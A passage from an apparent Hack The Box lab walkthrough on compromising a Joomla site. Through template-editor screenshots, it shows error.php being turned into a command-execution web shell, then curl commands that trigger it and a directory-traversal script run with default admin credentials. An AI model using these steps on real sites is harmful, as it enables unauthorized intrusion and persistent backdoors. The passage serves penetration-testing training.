...
![Joomla control panel with update notification, PHP warning, and statistics permission request. Displays post-installation messages and user actions.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/joomla_admin.png)

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

   

![Joomla templates page requesting permission to collect statistics, showing styles Beez3 and Protostar.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/joomla_templates.png)
...
![Joomla template customization page requesting permission to collect statistics, with options to select and manage files.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/joomla_customise.png)
...
![Joomla template editor for Protostar, editing error.php with a system command vulnerability, and a request for statistics permission.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/joomla_edited.png)
...
```shell-session
realCustampin@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
...
```shell-session
realCustampin@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
